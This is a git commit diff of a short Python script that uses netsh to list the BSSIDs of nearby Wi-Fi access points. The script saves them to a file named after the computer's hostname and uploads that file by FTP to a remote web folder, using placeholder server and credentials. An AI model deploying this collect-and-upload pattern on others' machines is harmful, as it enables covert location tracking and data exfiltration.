4eb60f7b4088a4503eb5eebbe53f91749d60e35c
MekoNix <64309709+MekoNix@users.noreply.github.com>
2022-07-20 20:37:28 +0300

    Update BGL.py

--- BGL.py
+++ BGL.py
@@ -1,9 +1,10 @@
-import os, time
+import os, time, socket 
 from ftplib import FTP
 # netsh wlan show all  | find "BSSID" - find  BSSID only of near AP
 # netsh wlan show interfaces | find "BSSID" - find BSSID only connected AP
-
-f = open('settings.vnl', 'w')
+netsh = os.popen('netsh wlan show all  | find "BSSID"')
+computernam=socket.gethostname()
+f = open( computernam, 'w')
 f.write("""BSSID of near AP 
 """)
 netsh = os.popen('netsh wlan show all  | find "BSSID"')
@@ -11,9 +12,9 @@ for id in netsh.readlines():
     f.write(id)
 f.close()
 from ftplib import FTP
-ftp = FTP(' FTP server')
-ftp.login(user=" username ",passwd="password")
+ftp = FTP('ftpname')
+ftp.login(user="user",passwd="password")
 ftp.cwd(dirname="htdocs")
-path="settings.vnl"
+path=computernam
 with open(path, 'rb') as fobj:
     ftp.storbinary('STOR ' + path, fobj, 1024)
